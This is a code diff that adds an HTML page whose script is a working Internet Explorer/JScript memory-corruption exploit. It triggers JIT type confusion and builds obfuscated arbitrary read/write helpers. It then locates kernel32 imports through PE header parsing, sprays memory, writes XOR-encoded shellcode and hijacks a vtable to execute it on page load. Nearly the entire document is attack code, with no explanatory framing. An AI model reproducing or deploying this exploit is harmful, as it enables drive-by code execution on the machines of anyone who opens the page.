@@ -1,3 +1,260 @@
-<php?>
-  alert("OK!!");
-<?>
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Expires" content="-1">
+<meta http-equiv="X-UA-Compatible" content="IE=11">
+</head>
+<body>
+
+<script>
+
+var b = new Array(256);
+for (var j = 0; j < b['length']; j++) {
+b[j] = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15);
+}
+
+function  foo ( ) { 
+        g = new  ArrayBuffer ( 1400 ); 
+        d = new  Int32Array (g); 
+        var j = 1 ; 
+        var e = new  Object ({ 
+            a : 1 , 
+            b : 2 ,   
+            c : "3" , 
+            d : b[52],
+            e : 5 , 
+		}); 
+        function  boom ( m ) { 
+            var q = d; 
+            var l = q[0];
+			var sese = 0x20000000;
+
+            for ( var o = 0 ; o < 1 ; o++) { 
+                if (m) { 
+                    for ( var n = 0 ; n < 1 ; n++) { 
+                        j++;
+                        q = j;    
+                        break ; 
+                    } 
+                    if (m){ 
+                        q = e;
+                     } 
+                    q[- 1 ] = 1 ; 
+                } 
+            } 
+            if (m){ 
+                q[8] = sese - 1;
+				q[21] = sese - 1;
+				q[22] = sese - 1;
+             } 
+        } 
+        for ( let h = 0 ; h < 100000 ; h++) { 
+            boom ( false ); 
+        } 
+        boom ( true ); 
+} 
+foo();
+
+
+
+
+var arraybuffer = new ArrayBuffer(16);
+var dataview = new DataView(arraybuffer);
+b[53][0] = dataview;
+
+var b53_low = b[52][32];
+var b53_high = b[52][33];
+
+b[52][80] = b53_low;
+b[52][81] = b53_high;
+b[52][82] = b53_low;
+b[52][83] = b53_high;
+
+var dataview_obj_addr_high = b[54][1],dataview_obj_addr_low = b[54][0];
+b[52][80] = dataview_obj_addr_low - 4;
+b[52][81] = dataview_obj_addr_high;
+b[52][82] = dataview_obj_addr_low - 4;
+b[52][83] = dataview_obj_addr_high;
+
+function bgfgryjh(addr_low, addr_high) {
+	b[54][7] = addr_low;
+	b[54][8] = addr_high;
+	return dataview['getInt8'](0, true);
+}
+function bnmjrr(addr_low, addr_high) {
+	b[54][7] = addr_low;
+	b[54][8] = addr_high;
+	return dataview['getInt32'](0, true);
+}
+function bngntyty(addr_low, addr_high, val, val2) {
+	b[54][7] = addr_low;
+	b[54][8] = addr_high;
+	dataview['setInt32'](0, val, true);
+	dataview['setInt32'](4, val2, true);
+}
+vtfunc_low = bnmjrr(b[52][22], b[52][23]) & 0xFFFFF000;
+vtfunc_high = bnmjrr(b[52][22]+4, b[52][23]);
+do {
+	doshdr = bnmjrr(vtfunc_low, vtfunc_high) & 0xFFFF;
+	while (doshdr != 0x5A4D) 
+	{
+		if (vtfunc_low == 0)
+		{
+			vtfunc_high - 1;
+			vtfunc_low = 0xFFFFF000;
+		}
+		else
+		{
+			vtfunc_low -= 0x1000;
+		}
+		
+		doshdr = bnmjrr(vtfunc_low, vtfunc_high) & 0xFFFF;
+		
+	}
+	pehdr = bnmjrr(vtfunc_low + bnmjrr(vtfunc_low + 0x3C, vtfunc_high), vtfunc_high);
+} while(pehdr != 0x4550)
+iatAddr_low = vtfunc_low + bnmjrr(vtfunc_low + bnmjrr(vtfunc_low + 0x3C, vtfunc_high) + 0x90, vtfunc_high);
+iatAddr_high = vtfunc_high;  //IAT 얻기
+var iii = 0;
+do {
+	dllName_low = vtfunc_low + bnmjrr(iatAddr_low + 0x0C, iatAddr_high);
+	dllName_high = iatAddr_high;
+	iii ++;
+	var b1 = bgfgryjh(dllName_low, dllName_high);
+	var b2 = bgfgryjh(dllName_low + 1, dllName_high);
+	var b3 = bgfgryjh(dllName_low + 2, dllName_high);
+	var b4 = bgfgryjh(dllName_low + 3, dllName_high);
+	var b5 = bgfgryjh(dllName_low + 4, dllName_high);
+	var b6 = bgfgryjh(dllName_low + 5, dllName_high);
+	var b7 = bgfgryjh(dllName_low + 6, dllName_high);
+	var b8 = bgfgryjh(dllName_low + 7, dllName_high);
+	if ( b1 != 0x6B && b1 != 0x4B)
+	{
+		iatAddr_low = iatAddr_low + 0x14;
+		continue;
+	}
+	if (b2 != 0x65 && b2 != 0x45)
+	{
+		iatAddr_low = iatAddr_low + 0x14;
+		continue;
+	}
+	if (b3 != 0x72 && b3 != 0x52)
+	{
+		iatAddr_low = iatAddr_low + 0x14;
+		continue;
+	}
+	if (b4 != 0x6E && b4 != 0x4E)
+	{
+		iatAddr_low = iatAddr_low + 0x14;
+		continue;
+	}
+	if (b5 != 0x65 && b5 != 0x45)
+	{
+		iatAddr_low = iatAddr_low + 0x14;
+		continue;
+	}
+	if (b6 != 0x6C && b6 != 0x4C)
+	{
+		iatAddr_low = iatAddr_low + 0x14;
+		continue;
+	}
+	if (b7 != 0x33)
+	{
+		iatAddr_low = iatAddr_low + 0x14;
+		continue;
+	}
+	if (b8 != 0x32)
+	{
+		iatAddr_low = iatAddr_low + 0x14;
+		continue;
+	}
+	break;
+} while(iii < 30)
+
+iatNames_low = vtfunc_low + bnmjrr(iatAddr_low, iatAddr_high);
+iatNames_high = vtfunc_high;
+iatAddrs_low = vtfunc_low + bnmjrr(iatAddr_low + 0x10, iatAddr_high);
+iatAddrs_high = vtfunc_high;
+iii = 0;
+do {
+	name_low = vtfunc_low + bnmjrr(iatNames_low + 8 * iii, iatNames_high);
+	name_high = vtfunc_high;
+	
+	var funcName = bnmjrr(name_low, name_high);
+	if ( funcName == 0x69560492) break;
+	
+	iii ++;
+} while(iii < 300)
+func_low = bnmjrr(iatAddrs_low + 8*iii, iatAddrs_high);
+func_high = bnmjrr(iatAddrs_low + 8*iii + 4, iatAddrs_high);
+var literal_string = "A";
+var compound_string = "";
+for (var i = 0; i < 2900; i++) {
+compound_string = compound_string + '%u' + '0020';
+}
+for (var i = 0; i < 64; i++) {
+compound_string = compound_string + '%u' + '0030';
+}
+compound_string = unescape(compound_string);
+var shee = unescape("%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%uED09%u5A64%uED09%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u8AD8%uD730%uD534%u567A%u1234%u525A%u5A64%uED09%u8210%uD2F5%u5A34%u5678%u9210%uD2F1%u5A34%u5678%u9210%uD2F1%u5A34%u5678");
+
+var sde = [0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x82A4C6E8, 0x8AD8D730, 0xFA34567A, 0x12345254, 0x3670DF30, 0xA7ABEC18, 0x4C8DA5E8, 0xFA64ED09, 0x1234574C, 0x36B0DF30, 0x123456F8, 0x36B0DB30, 0x123456E8, 0x3670DF30, 0x96B91E00, 0x1235465C, 0x56BD1E78, 0x9F7C265C, 0x12A472FC, 0x9B7C5678, 0xD55C723C, 0x1264723C, 0xF9345678, 0x3670DD72, 0x9BF4A928, 0x9164723C, 0x52647204, 0x997C4A05, 0x5A5C723C, 0x123456BF, 0x997C5678, 0x5A5C723C, 0x5A3C96FB, 0x7A1012F1, 0x997C8593, 0xD544723C, 0x12343E78, 0x56BF1E78, 0x52F3265C, 0x12345744, 0x56BF1E78, 0x917C365C, 0x9B7C50B8, 0xD56C723C, 0x1260723C, 0xF9345678, 0x3670DD72, 0x9BF4A92C, 0x5A60723C, 0x721012F3, 0x2B34E177, 0x6F60723C, 0x56BF1E50, 0x997C0E5C, 0x99547234, 0x12BF5431, 0x997C974B, 0x9B6C7234, 0x56BF1E79, 0x917C0E5C, 0x9B7C52B8, 0xF96C723C, 0x56BF1EB8, 0x917C365C, 0x997C50B8, 0x5A4C7234, 0x5A101AF1, 0x3678DD30, 0x5EBD1E08, 0xD57C165C, 0x120C723C, 0x5A345678, 0x221012BF, 0x12345678, 0x3A1012BF, 0x12345668, 0x321012BF, 0x12345678, 0x57FD653D, 0x997C964B, 0xEDFD65A8, 0x12B472EC, 0x937C5678, 0x1236CEBC, 0xDEF89578, 0xDEF89AB4, 0x021002F1, 0x1A101AF1, 0x5AD8D530, 0x1236B190, 0x56BD1E78, 0x997C7E5C, 0x5A1C723C, 0x5A2C16F3, 0x221012F1, 0x3670DD30, 0x52BF1E48, 0x56BD1E58, 0x997C765C, 0x5A14723C, 0x2A1012F1, 0x3670DD30, 0x5ABF1E58, 0x1276BE38, 0x560F5678, 0x0D40065C, 0x3670DD30, 0x12BF1E58, 0x3670DF30, 0x56BF1E58, 0x2B7C6E5C, 0x6714723C, 0xF9F4657C, 0x99F9BD6C, 0x5A6C722C, 0x321012F3, 0x327CDD30, 0x12350590, 0xD6B71E78, 0xDEF89530, 0xDEF89AB4, 0x3678DF30, 0xFEB71E70, 0x56BF1E60, 0x9B7C765C, 0x5A3C723C, 0x1A1012F3, 0x9734E177, 0x5A2422B8, 0x1A1012F3, 0x10F4D530, 0x3670DF30, 0x5AD0BD70, 0x1A1012F3, 0x9134E177, 0x02400A80, 0x3670DD30, 0xFAB71E70, 0x56BD1E7A, 0xF1DF5E5C, 0x3670DD30, 0xD2B71E70, 0x56BD1E7A, 0x56F35E5C, 0x1234525C, 0x997C5678, 0x1D3C723C, 0xD2B156CF, 0x997C020C, 0x1D3C723C, 0x9B5256CF, 0xA53B727C, 0xEAB7727C, 0x1D3F2819, 0x911052CF, 0x9B527690, 0xA53B727C, 0x5EBF727C, 0xDA37525C, 0x56BD97F3, 0x56BF525C, 0xFAF5525C, 0x3678DD75, 0x01D5977C, 0x56BD9773, 0x997C525C, 0x5A3C723C, 0x5A3696FB, 0x1A1012F1, 0x56BFF693, 0x917C525C, 0xDEF74EBC, 0xDEF89AB4, 0xDEF89AB4, 0x3678DF30, 0xFEB71E70, 0x36709160, 0x1234567C, 0x56BF1E78, 0x9B7C765C, 0x5A3C723C, 0x1A1012F3, 0x9734E877, 0x5A0922B8, 0x1A1012F3, 0x16BC56F2, 0x168A595C, 0x3678DD5C, 0x99FC557C, 0x3670DFB9, 0x3670DD7C, 0x1FDC977C, 0x16101AF3, 0x1927B7B9, 0x3670DFB9, 0x56BF1E7C, 0xED7C5E5C, 0x56BD1EB8, 0xA5DF5E5C, 0x161012F3, 0x0AF0D530, 0xDEF89ABB, 0xDEF89AB4, 0x021002F1, 0x3678DF30, 0xFEB71E70, 0x56BF1E10, 0x9B7C265C, 0x5A74723C, 0x521012F3, 0x2E743530, 0x3678DD30, 0xDA371E08, 0x5AF5DD30, 0x5A1012F1, 0x12345EC0, 0xD25F1E78, 0x5EBF1E78, 0x96BF1E5C, 0x1234DE79, 0x5EBF1E78, 0x117C265C, 0xD3BF1EB0, 0x3670DF30, 0x56BF1E50, 0x52BF7E5C, 0x56371E58, 0x9B7C265C, 0x5A04723C, 0x3A1012F3, 0x5A1016F3, 0x6210127B, 0x3670DF30, 0x36709140, 0x12345658, 0x993EBD78, 0xED14723C, 0x3670DFB8, 0x56BF1E58, 0x52BF7E5C, 0x36706F6C, 0x5A5C2558, 0x221012F3, 0x117C56F3, 0x5A44723C, 0x421012F1, 0x3678DD30, 0xECE2BE28, 0x560FA987, 0x3B412E5C, 0x3670DD30, 0x0E74DD50, 0x36705530, 0x56BD1E08, 0x997C0E5C, 0x1D0C723C, 0x997C56CF, 0x996C7234, 0x117CD77C, 0xF944723C, 0x56BF1E58, 0x917C665C, 0x9B7C52B8, 0x5A04723C, 0x2A1012F3, 0x10F4D530, 0x3670DF30, 0x21B4BD40, 0xD6B71EB8, 0xDEF89510, 0xDEF89AB4, 0x3AD8D530, 0x12344390, 0xD6B71E78, 0xDEF89550, 0xDEF89AB4, 0x16BF1E1D, 0x1234365D, 0x12DC9578, 0x4A345678, 0x14F4D530, 0x7234D0BB, 0x020BF1F5, 0x006E869A, 0x1E6E9986, 0x3726D199, 0x0768948D, 0x1C649881, 0x1B679EA5, 0x102B8896, 0x016A818C, 0x012FD186, 0x16799099, 0x55368394, 0x10329391, 0x113290CC, 0x1032C1CC, 0x103290CC, 0x40689791, 0x456F9791, 0x1332C097, 0x406FC9CD, 0x1632C197, 0x1332C4CC, 0x103392CC, 0x406F9791, 0x44339394, 0x133297CD, 0x1732C097, 0x1332C3CC, 0x116A9791, 0x1133C7CD, 0x133293CD, 0x436FC3CC, 0x1332C097, 0x436F93CD, 0x1332C994, 0x116995CC, 0x4432C2CC, 0x433290CC, 0x446F93CD, 0x1069C091, 0x4A33C1CC, 0x4132C0CC, 0x1732C1CC, 0x116A93CC, 0x163393CD, 0x4332C7CC, 0x456FC9CC, 0x4532C991, 0x103393CD, 0x113397CD, 0x426FC496, 0x1633C191, 0x4A3394CC, 0x4A32C091, 0x1033C7CC, 0x1333C6CC, 0x133395CC, 0x133292CD, 0x113295CD, 0x4332C1CC, 0x133293CD, 0x1033C0CC, 0x1132C091, 0x4032C1CC, 0x1033C191, 0x4433C1CC, 0x1133C7CC, 0x103394CC, 0x443393CD, 0x1632C191, 0x473394CC, 0x426FC4CD, 0x133295CD, 0x1133C8CC, 0x4532C191, 0x173290CC, 0x113393CC, 0x4032C191, 0x443294CC, 0x426FC0CC, 0x426F94CC, 0x436F94CC, 0x453393CD, 0x4A6F93CD, 0x4668C791, 0x1332C7CC, 0x146FC6CD, 0x10329391, 0x113290CC, 0x1032C1CC, 0x103290CC, 0x492CC596, 0x1C7E9AD1, 0x4F6A9A9E, 0x5630D6D2, 0x493BCC9C, 0x52709E91, 0x0A6E83D1, 0x4F79908D, 0x136782D1, 0x006A9587, 0x2F62D5AE, 0x1E78D5DE, 0x136F8394, 0x1B2FAA87, 0x4956C0DE, 0x1C7E9AD1, 0x4F6A9A9E, 0x0760D5D5, 0x13609A9B, 0x1A68AADE, 0x5A568394, 0x146D89C5, 0x1D68AAD8, 0x006E879B, 0x4831AC81, 0x1C629E81, 0x5A3DC081, 0x0A6E83D1, 0x5E79908D, 0x5B22C7C4, 0x4F62D5CE, 0x402098D1, 0x1B638688, 0x56239499, 0x1E26D19C, 0x012FD190, 0x16799099, 0x3E258394, 0x066C9F90, 0x5B39DC9D, 0x0A6E98CE, 0x0760D5D5, 0x13609A9B, 0x820BF1CE, ];
+
+b[53][1] = literal_string;
+b[53][3] = compound_string;
+b[53][2] = shee;
+
+lsop_low_low = (b[52][32] + 32);
+lsop_high_low = (b[52][32] + 36);
+lsop_high = b[52][33];
+lllll = bnmjrr(b[52][32] + 32, b[52][33]);
+kkkkk = bnmjrr(b[52][32] + 36, b[52][33]);
+lsop = {
+addr_low: lllll,
+addr_high: kkkkk
+}
+
+vft_func_low=bnmjrr(lsop.addr_low, lsop.addr_high);
+vft_func_high =bnmjrr(lsop.addr_low+4, lsop.addr_high);
+
+function cp_func(val) {
+	fvft_func_low = bnmjrr(vft_func_low+8*val, vft_func_high);
+	fvft_func_high = bnmjrr(vft_func_low+8*val+4, vft_func_high);
+	bngntyty(b[52][176]+24+val * 8, b[52][177], fvft_func_low, fvft_func_high);
+}
+
+for (var i = 0; i < 88; i++) {
+	cp_func(i);        
+}
+bngntyty(lsop.addr_low, lsop.addr_high, b[52][176] + 24, b[52][177]);
+csop = {
+addr_low: bnmjrr(b[52][32] + 48, b[52][33]),
+addr_high: bnmjrr(b[52][32] + 52, b[52][33])
+}
+scsop = {
+addr_low: bnmjrr(b[52][32] + 40, b[52][33]),
+addr_high: bnmjrr(b[52][32] + 44, b[52][33])
+}
+scsbp = {
+addr_low: bnmjrr(scsop.addr_low+32, scsop.addr_high),
+addr_high: bnmjrr(scsop.addr_low+36, scsop.addr_high),
+}
+
+for(i=0;i<214;i++){
+bngntyty(scsbp.addr_low+i*8, scsbp.addr_high, sde[i*2]^0x12345678, sde[i*2+1]^0x12345678);}
+
+bngntyty(scsbp.addr_low, scsbp.addr_high,bnmjrr(lsop.addr_low, lsop.addr_high),bnmjrr(lsop.addr_low+4, lsop.addr_high));
+bngntyty(scsbp.addr_low+8, scsbp.addr_high,bnmjrr(lsop.addr_low+8, lsop.addr_high),bnmjrr(lsop.addr_low+12, lsop.addr_high));
+bngntyty(scsbp.addr_low+16, scsbp.addr_high,bnmjrr(csop.addr_low+16, csop.addr_high),bnmjrr(csop.addr_low+20, csop.addr_high));
+bngntyty(scsbp.addr_low+24, scsbp.addr_high,bnmjrr(csop.addr_low+32, csop.addr_high),bnmjrr(csop.addr_low+36, csop.addr_high));
+bngntyty(b[52][32] + 32, b[52][33], scsbp.addr_low, scsbp.addr_high);
+var offset = 89;
+bngntyty(b[52][176] + 24 + offset * 8, b[52][177], func_low, func_high),
+b[53][1]['trim'](),
+bngntyty(b[52][176] + 24 + offset * 8, b[52][177], scsbp.addr_low + 32, scsbp.addr_high),
+b[53][1]['trim']();
+
+
+</script>
+</body>
+</html>
